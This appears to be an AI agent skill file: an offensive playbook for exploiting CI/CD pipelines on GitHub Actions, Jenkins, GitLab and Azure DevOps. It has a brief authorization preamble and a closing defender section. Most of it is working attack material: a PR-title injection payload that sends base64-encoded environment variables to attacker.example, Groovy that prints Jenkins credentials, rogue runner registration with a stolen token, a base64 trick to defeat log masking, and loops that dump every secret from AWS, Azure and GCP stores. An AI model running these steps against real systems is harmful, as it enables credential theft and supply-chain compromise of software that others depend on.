---
name: offensive-cicd-pipeline
description: "CI/CD exploitation and secret extraction: GitHub Actions injection, Jenkins RCE, GitLab CI, Azure DevOps, artifact poisoning, Vault/KMS, runner tokens, OIDC. Triggers - Jenkins, GitHub Actions, CI secrets, runner, OIDC."
---

## Rules of Engagement
Only test systems you are authorized to assess. Confirm the written scope and rate limits before active commands. Prefer the least-invasive check that proves impact; stop on evidence of production impact.

# Offensive CI/CD Pipeline and Secrets Exploitation

A compromised pipeline executes code in trusted contexts, holds deployment credentials, and can
inject malicious code into production artifacts. This skill covers GitHub Actions, Jenkins, GitLab
CI, and Azure DevOps, from injection to code execution, plus the secret extraction paths that follow.

MITRE ATT&CK: T1195.002 (Supply Chain Compromise), T1552 (Unsecured Credentials).

## Quick Workflow

1. Enumerate repositories and pipeline configs (`.github/workflows/`, `Jenkinsfile`, `.gitlab-ci.yml`, `azure-pipelines.yml`).
2. Identify the trigger model, which contexts carry attacker-controlled input, and the token/secrets/federation scope.
3. Select the injection vector matching your access level (contributor, external PR, authenticated user).
4. Craft the payload for the target platform's expression language or script engine.
5. Extract output -- environment, tokens, secrets, or modified artifacts -- and pivot across pipelines, registries, and cloud infrastructure.

---

## GitHub Actions

Attacker-controlled PR titles, issue bodies, branch names, and commit messages that flow into `run:`
or action inputs, or untrusted code checked out under a privileged trigger, yield command execution.

### Expression Injection

Search for interpolated event data in workflows:

```bash
grep -rn '\${{.*\(github\.event\.\|github\.head_ref\)' .github/workflows/
```

Vulnerable workflow and payload:

```yaml
on: pull_request_target
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Thanks for PR: ${{ github.event.pull_request.title }}"
```

```text
"; curl -sS https://attacker.example/collect -d "$(env | base64)" #
```

### untrusted checkout and workflow_run

`pull_request_target` runs with a privileged token and secrets while the PR code is untrusted. If the
workflow checks out `github.event.pull_request.head.sha` and then builds or installs, attacker code
runs with those secrets. The `workflow_run` trigger runs on the default branch but can read artifacts
from the triggering workflow; upload a poisoned artifact from an unprivileged PR and the privileged
handler processes it:

```yaml
- uses: actions/upload-artifact@v4
  with: { name: pr-data, path: payload.sh }
on: { workflow_run: { workflows: ["PR Build"], types: [completed] } }
jobs:
  deploy:
    steps:
      - uses: actions/download-artifact@v4
      - run: bash pr-data/payload.sh
```

Enumerate token scope with the `GITHUB_TOKEN` against `api.github.com/repos/$GITHUB_REPOSITORY`.

Pin third-party actions to a commit SHA; mutable tags can be force-pushed. `gato` enumerates runners
and injection sinks:

```bash
gato enumerate -t ghp_TOKENHERE -o target-org
```

---

## Jenkins

### Script Console RCE

Script console access (Overall/RunScripts) is unrestricted controller code execution:

```groovy
println "id && cat /etc/passwd".execute().text

import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
def creds = CredentialsProvider.lookupCredentials(
    StandardUsernamePasswordCredentials.class, Jenkins.instance, null, null)
creds.each { c -> println("${c.id} ${c.username} ${c.password.plainText}") }
```

The Groovy sandbox does not apply to the script console. With only build-configuration access,
prefer legitimate pipeline steps that print or move credentials; sandbox-escape tricks are
version-dependent and unreliable.

Offline `credentials.xml` decryption needs `secrets/master.key` and `secrets/hudson.util.Secret`
from `$JENKINS_HOME`: SHA-256 the master key, AES-ECB-decrypt the hudson secret with its first 16
bytes, then AES-128-CBC-decrypt entries with that key (IV is bytes 1-17 of the ciphertext).

### Remoting Deserialization

An exposed remoting port (default 50000) exposes the Java remoting protocol. Test known gadget
chains with `ysoserial` against the JNLP handshake. Network-visible and may crash the controller;
treat it as a last resort.

### Shared Library Injection

`@Library` shared libraries are a supply chain vector: write access to the library repo executes in
every consuming pipeline. `jenkins-attack-framework` automates enumeration and credential dump:

```bash
python3 jaf.py --url https://jenkins.example --cookie "JSESSIONID=abc123" --dump-creds
```

---

## GitLab CI

### Merge Request Pipeline Injection

With fork MR pipelines enabled, the fork's `.gitlab-ci.yml` runs on target runners with project
variables:

```yaml
dump:
  script:
    - env | sort
    - curl -sS --header "JOB-TOKEN: $CI_JOB_TOKEN" \
        "https://gitlab.example/api/v4/projects/$CI_PROJECT_ID/variables" | jq '.'
```

Protected variables reach protected refs only; fork MRs and unprotected branches receive only
unprotected variables. Map that boundary first.

### Runner Registration Token Abuse

A leaked registration token registers a rogue runner:

```bash
gitlab-runner register --non-interactive --url "https://gitlab.example/" \
  --registration-token "STOLEN_TOKEN" --executor shell \
  --tag-list "docker,linux,deploy" --run-untagged true
```

It captures job environment variables and modifies artifacts before publishing. Treat the token as
equivalent to interception of every matching job.

---

## Azure DevOps

### Agent Abuse

Self-hosted agents persist state between builds:

```yaml
pool: { name: 'Self-Hosted-Pool' }
steps:
- script: |
    env | sort
    find /home/ -name ".kube" -o -name ".aws" -o -name ".azure" 2>/dev/null
    cat /home/*/.aws/credentials /home/*/.kube/config 2>/dev/null
```

### Service Connection Theft

Service connections inject external credentials into tasks. With edit access, wrap the connection in
`AzureCLI@2` and extract the token:

```yaml
- task: AzureCLI@2
  inputs:
    azureSubscription: 'Production-Azure-Connection'
    scriptType: inlineScript
    inlineScript: |
      az account get-access-token --output json
      az keyvault secret list --vault-name TARGET_VAULT --output table
```

A compromised PAT extracts variable groups and connection metadata over REST:

```bash
curl -sS -u ":$PAT" \
  "https://dev.azure.com/$ORG/$PROJECT/_apis/distributedtask/variablegroups?api-version=7.0" \
  | jq '.value[] | {name, variables}'
```

---

## Secret Extraction

### Environment, Logs, and Caches

Environment variables are the first extraction path on every platform. Log masking matches known
secret values; encoding the output defeats it. Write dumps to evidence rather than exfiltrating
inline -- DNS and ICMP channels are slow and rate-limited.

```bash
env | sort
env | base64   # bypass value masking
env | grep -iE '^(AWS_|AZURE_|GCP_|GITHUB_|GITLAB_|DOCKER_|VAULT_|SSH_|API_KEY|SECRET|TOKEN|PASSWORD)'
env | grep -E '=ghp_[A-Za-z0-9]{36}|=glpat-[A-Za-z0-9_-]{20}|=AKIA[A-Z0-9]{16}'  # token shapes
```

Build logs leak unmasked credentials through careless scripting and debug output:

```bash
curl -sS -L -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/actions/runs/$RUN_ID/logs" -o logs.zip
unzip -o logs.zip -d logs && \
  grep -rihE '(AKIA[A-Z0-9]{16}|ghp_[A-Za-z0-9]{36}|eyJ[A-Za-z0-9_-]+\.eyJ)' logs/
curl -sS -u "user:$JENKINS_TOKEN" "https://jenkins.example/job/JOB/lastBuild/consoleText"
```

Caches and artifacts cross job boundaries: a `cache: policy: push` job can seed a path pulled by a
later privileged job. Verify what the consuming job executes from cache before relying on it.

### Vault and Cloud Secret Managers

Reuse the token the pipeline already holds:

```bash
vault secrets list
curl -sS -H "X-Vault-Token: $VAULT_TOKEN" "$VAULT_ADDR/v1/sys/capabilities-self" \
  -d '{"paths":["secret/*","aws/*","database/*"]}' | jq '.'   # often over-permissioned for CI
aws secretsmanager list-secrets --query 'SecretList[].Name' --output text | tr '\t' '\n' | \
  while read n; do aws secretsmanager get-secret-value --secret-id "$n" --query SecretString --output text; done
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
az keyvault secret list --vault-name "$VAULT" --query '[].name' --output tsv | \
  while read n; do az keyvault secret show --vault-name "$VAULT" --name "$n" --query value -o tsv; done
gcloud secrets list --format='value(name)' | while read n; do gcloud secrets versions access latest --secret="$n"; done
```

Instance metadata also serves runner credentials at `169.254.169.254` (AWS IMDS, Azure IMDS, GCP
metadata).

### OIDC Federation Abuse

OIDC assumes cloud roles without stored credentials; the weakness is an over-broad trust policy.
Inspect the `sub` claim:

```yaml
- run: |
    TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
    echo "$TOKEN" | cut -d. -f2 | base64 -d | jq '.'
```

A policy conditioned on `repo:target-org/*` accepts any repository in the organization; assume the
role from a workflow you control:

```bash
aws sts assume-role-with-web-identity \
  --role-arn "arn:aws:iam::ACCOUNT:role/deploy-role" \
  --role-session-name exploit --web-identity-token "$TOKEN"
```

GitLab uses `id_tokens`; a trust policy that omits `ref_protected` is assumable from an unprotected
branch:

```yaml
job:
  id_tokens:
    AWS_TOKEN: { aud: https://aws.amazon.com }
  script:
    - echo "$AWS_TOKEN" | cut -d. -f2 | base64 -d | jq '.'
```

### Runner Tokens and Credential Stores

Filesystem credentials support job interception and controller access:

```bash
cat /home/runner/.runner /home/runner/.credentials 2>/dev/null   # GitHub self-hosted
grep -E '(token|url)' /etc/gitlab-runner/config.toml 2>/dev/null
find / -name "secret.key" -path "*/jenkins/*" 2>/dev/null
cat ~/.docker/config.json 2>/dev/null | jq '.'                  # registry credentials
```

GitHub and GitLab secrets are only readable as names over the API; values require the execution
context above:

```bash
curl -sS -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets" | jq '.secrets[].name'
```

---

## Detection / Defender View

Monitor for workflow-file changes in fork PRs; new runner registrations with broad tag matching; CI
jobs accessing secrets they historically did not; shell metacharacters in PR titles or issue bodies;
unexpected artifact hash changes; token calls outside scope; Jenkins script-console use; builds that
run longer than baseline; runner egress to non-registry hosts.

Controls: pin actions to commit SHAs; never check out PR head under `pull_request_target`; use
ephemeral runners and scrub persistent ones; use OIDC with narrow claim constraints; require review
for workflow changes; segment runner pools by trust level; audit secrets access; least privilege.

---

## Key References

- OWASP Top 10 CI/CD Security Risks: https://owasp.org/www-project-top-10-ci-cd-security-risks/
- CI/CD Goat: https://github.com/cider-security-research/cicd-goat
- gato: https://github.com/praetorian-inc/gato
- jenkins-attack-framework: https://github.com/Accenture/jenkins-attack-framework
- MITRE ATT&CK T1195.002: https://attack.mitre.org/techniques/T1195/002/
- MITRE ATT&CK T1552: https://attack.mitre.org/techniques/T1552/
- truffleHog: https://github.com/trufflesecurity/trufflehog
